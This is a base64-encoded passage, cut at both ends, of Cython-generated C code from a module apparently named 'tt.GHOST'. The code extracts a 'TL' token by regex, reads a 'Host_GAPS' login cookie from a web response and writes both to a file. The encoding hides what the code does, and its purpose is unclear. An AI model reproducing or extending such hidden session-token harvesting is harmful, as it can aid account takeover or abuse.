KVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3ZfdGxfbWF0Y2ggPSBfX3B5eF90XzU7XG4gICAgICBfX3B5eF90XzUgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF92X3RsX21hdGNoKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzkgPCAwKSkpIF9fUFlYX0VSUigwLCAxMDcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKGxpa2VseShfX3B5eF90XzkpKSB7XG5cbiAgICAgICAgXG4gICAgICAgIF9fcHl4X3RfMTMgPSBfX3B5eF92X3RsX21hdGNoO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMyk7XG4gICAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIHtcbiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzF9O1xuICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dyb3VwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgyLV9fcHl4X3RfOCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMDgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICB9XG4gICAgICAgIF9fcHl4X3ZfdGwgPSBfX3B5eF90XzU7XG4gICAgICAgIF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgXG4gICAgICAgIGdvdG8gX19weXhfTDExO1xuICAgICAgfVxuXG4gICAgICBcbiAgICAgICB7XG4gICAgICAgIF9fcHl4X3RfMTMgPSBOVUxMO1xuICAgICAgICBfX3B5eF90XzggPSAxO1xuICAgICAgICB7XG4gICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfVExfbm90X2ZvdW5kfTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSksIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTEwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9SYWlzZShfX3B5eF90XzUsIDAsIDAsIDApO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QWVhfRVJSKDAsIDExMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICB9XG4gICAgICBfX3B5eF9MMTE6O1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yZXNwb25zZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nvb2tpZXMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzEwID0gX19weXhfdF82O1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19weXhfdF84ID0gMDtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIE5VTEx9O1xuICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0X2RpY3QsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDEtX19weXhfdF84KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxMTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICB9XG4gICAgICBfX3B5eF90XzEzID0gX19weXhfdF8xMTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEzKTtcbiAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzEzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0hvc3RfR0FQUywgX19weXhfdl9ob3N0fTtcbiAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgzLV9fcHl4X3RfOCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDExMSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgfVxuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF92X2hvc3QsIF9fcHl4X3RfNSk7XG4gICAgICBfX3B5eF90XzUgPSAwO1xuXG4gICAgICBcbiAgICAgICB7XG4gICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfYnVpbHRpbl9vcGVuLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDExMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICBfX3B5eF90XzE0ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDExMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgX19weXhfdF8xMyA9IE5VTEw7XG4gICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMTIsIF9fcHl4X0wxMl9lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgIF9fcHl4X3RfOCA9IDE7XG4gICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgICAgaWYgKGxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzYpKSkge1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzYpO1xuICAgICAgICAgIGFzc2VydChfX3B5eF90XzEzKTtcbiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTMpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF82LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIH1cbiAgICAgICAgI2VuZGlmXG4gICAgICAgIHtcbiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMywgTlVMTH07XG4gICAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF82LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgxLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxMTIsIF9fcHl4X0wxMl9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfdF82ID0gX19weXhfdF8xMTtcbiAgICAgICAgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAge1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMTUsICZfX3B5eF90XzE2LCAmX19weXhfdF8xNyk7XG4gICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNyk7XG4gICAgICAgICAgICAge1xuICAgICAgICAgICAgICBfX3B5eF92X2YgPSBfX3B5eF90XzY7XG4gICAgICAgICAgICAgIF9fcHl4X3RfNiA9IDA7XG5cbiAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fcHl4X3ZfZjtcbiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl90bCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxNl9lcnJvcilcbiAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgICAgICBfX3B5eF90XzEzID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfaG9zdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMykpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxNl9lcnJvcilcbiAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTMpO1xuICAgICAgICAgICAgICBfX3B5eF90XzE4WzBdID0gX19weXhfdF8xMTtcbiAgICAgICAgICAgICAgX19weXhfdF8xOFsxXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzU7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMThbMl0gPSBfX3B5eF90XzEzO1xuICAgICAgICAgICAgICBfX3B5eF90XzE4WzNdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNjtcbiAgICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMTgsIDQsIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTEpICsgMiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTMpICsgMSwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTEpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTMpKTtcbiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDE2X2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG4gICAgICAgICAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF90XzEwfTtcbiAgICAgICAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV93cml0ZSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMi1fX3B5eF90XzgpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMTZfZXJyb3IpXG4gICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG5cbiAgICAgICAgICAgICAgXG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgICAgICAgICBnb3RvIF9fcHl4X0wyMV90cnlfZW5kO1xuICAgICAgICAgICAgX19weXhfTDE2X2Vycm9yOjtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QudGxsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICAgICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfNiwgJl9fcHl4X3RfMTAsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDExMiwgX19weXhfTDE4X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSBQeVR1cGxlX1BhY2soMywgX19weXhfdF82LCBfX3B5eF90XzEwLCBfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTMpKSBfX1BZWF9FUlIoMCwgMTEyLCBfX3B5eF9MMThfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMyk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTkgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMTQsIF9fcHl4X3RfMTMsIE5VTEwpO1xuICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTkpKSBfX1BZWF9FUlIoMCwgMTEyLCBfX3B5eF9MMThfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzE5KTtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDtcbiAgICAgICAgICAgICAgaWYgKF9fcHl4X3RfOSA8ICgwKSkgX19QWVhfRVJSKDAsIDExMiwgX19weXhfTDE4X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICAgICAgX19weXhfdF8yMCA9ICghX19weXhfdF85KTtcbiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KF9fcHl4X3RfMjApKSB7XG4gICAgICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKF9fcHl4X3RfNiwgX19weXhfdF8xMCwgX19weXhfdF81KTtcbiAgICAgICAgICAgICAgICBfX3B5eF90XzYgPSAwOyAgX19weXhfdF8xMCA9IDA7ICBfX3B5eF90XzUgPSAwOyBcbiAgICAgICAgICAgICAgICBfX1BZWF9FUlIoMCwgMTEyLCBfX3B5eF9MMThfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICAgICAgZ290byBfX3B5eF9MMTdfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBfX3B5eF9MMThfZXhjZXB0X2Vycm9yOjtcbiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE3KTtcbiAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTUsIF9fcHl4X3RfMTYsIF9fcHl4X3RfMTcpO1xuICAgICAgICAgICAgZ290byBfX3B5eF9MM19lcnJvcjtcbiAgICAgICAgICAgIF9fcHl4X0wxN19leGNlcHRpb25faGFuZGxlZDo7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNyk7XG4gICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE1LCBfX3B5eF90XzE2LCBfX3B5eF90XzE3KTtcbiAgICAgICAgICAgIF9fcHl4X0wyMV90cnlfZW5kOjtcbiAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgIHtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBpZiAoX19weXhfdF8xNCkge1xuICAgICAgICAgICAgICBfX3B5eF90XzE3ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzE0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSwgTlVMTCk7XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNykpIF9fUFlYX0VSUigwLCAxMTIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNyk7XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBnb3RvIF9fcHl4X0wxNTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19weXhfTDE1OjtcbiAgICAgICAgfVxuICAgICAgICBnb3RvIF9fcHl4X0wyNTtcbiAgICAgICAgX19weXhfTDEyX2Vycm9yOjtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgZ290byBfX3B5eF9MM19lcnJvcjtcbiAgICAgICAgX19weXhfTDI1OjtcbiAgICAgIH1cblxuICAgICAgXG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIGdvdG8gX19weXhfTDhfdHJ5X2VuZDtcbiAgICBfX3B5eF9MM19lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuXG4gICAgXG4gICAgX19weXhfdF8yMSA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSkpKTtcbiAgICBpZiAoX19weXhfdF8yMSkge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC50bGwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfNSwgJl9fcHl4X3RfMTAsICZfX3B5eF90XzYpIDwgMCkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDVfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fcHl4X3ZfZSA9IF9fcHl4X3RfMTA7XG4gICAgICAge1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzExID0gTlVMTDtcbiAgICAgICAgX19weXhfdF84ID0gMTtcbiAgICAgICAge1xuICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X307XG4gICAgICAgICAgX19weXhfdF8xMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfYnVpbHRpbl9wcmludCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMi1fX3B5eF90XzgpIHwgKF9fcHl4X3RfOCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTMpKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMzFfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTMpO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG5cbiAgICAgICAgXG4gICAgICAgIF9fcHl4X3RfMTEgPSBOVUxMO1xuICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMTYsIF9fcHl4X0wzMV9lcnJvcilcbiAgICAgICAgX19Qe